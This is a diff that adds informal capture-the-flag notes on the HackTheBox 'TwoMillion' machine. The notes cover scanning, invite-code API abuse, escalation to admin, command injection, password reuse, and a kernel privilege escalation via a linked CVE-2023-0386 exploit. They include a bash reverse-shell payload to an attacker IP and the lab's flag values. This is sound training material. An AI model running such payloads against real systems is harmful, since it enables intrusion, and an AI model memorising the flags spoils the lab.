@@ -1,0 +1,123 @@
+nmap scaning : nmap -T4 -sV -sC 10.10.11.221
+
+add the host name -> /etc/hosts : 10.10.11.221 2million.htb
+
+check the web page.
+
+-> Download feroxbuster tool -> run to the the website transfer and doing .
+
+http://2million.htb/css/flags/ -> 403 error.
+
+http://2million.htb/invite -> need invite code to sign up a account (needed)
+
+some code might important 
+ eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{})).
+
+ ->  obfuscated ?
+
+ deobfuscated ->  https://beautifier.io/
+
+ got this : 
+
+ function verifyInviteCode(code) {
+    var formData = {
+        "code": code
+    };
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        data: formData,
+        url: '/api/v1/invite/verify',
+        success: function(response) {
+            console.log(response)
+        },
+        error: function(response) {
+            console.log(response)
+        }
+    })
+}
+
+function makeInviteCode() {
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        url: '/api/v1/invite/how/to/generate',
+        success: function(response) {
+            console.log(response)
+        },
+        error: function(response) {
+            console.log(response)
+        }
+    })
+}
+
+
+-> try POST method on the url in burpsuite or curl method with options -X and jq.
+
+-> got the message encoded in ROT13 -> decode : In order to generate the invite code, make a POST request to /api/v1/invite/generate
+
+try it on burpsuite.
+
+-> got the code might encoded in base64 -> decode it and try register ( note : if code not work try again ) 
+
+----> LOGIN--------.
+
+
+move to the acces page -> look it we can connect to that server.
+
+try the request on burpsuite move around the link ()
+
+need login as admin -> we can make another account ( is_admin:1 )
+fix in burpsuite.
+
+got the Session id of admin .
+
+->>> update withe method PUT : PUT /api/v1/admin/settings/update HTTP/1.1 ->> succesfull .
+
+-> let try get the vpn of admin : /api/v1/admin/vpn/generate.
+
+
+try the payload and catch the the shell : bash -c 'bash -i >& /dev/tcp/10.10.14.53/1234 0>&1' ( because it seems not valid the content type)
+
+
+Lateral Movement : 
+
+some note got from the shell .
+
+CVE-2023-0386
+user.txt -> this file need higher permission.
+
+-> got this password of admin in file .env( contain password ) : SuperDuperPass123
+
+->> try  ssh on that 
+-> got from file user.txt : 8f2a5fb24114586a2de55946db6d9ec5
+
+sudo -l -> root is runnning in all but it seems the roles is same as admin .
+
+exploit CVE-2023-0386 :https://github.com/xkaneiki/CVE-2023-0386 -> git clone that file -> zip it with tar or something 
+
+make a python lister server -> download the file have ziped in the target machine -> exploit that.
+
+note : we need start in 2 terminal.
+
+-> succesfull on root .
+
+from root.txt : cf985cdb97da2372c00536db5c0dee19 -> this is the flag.
+
+form thank_you.json : a message from HackTheBox ( we can deocde json that in cyberchef,xor with HackTheBox word)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
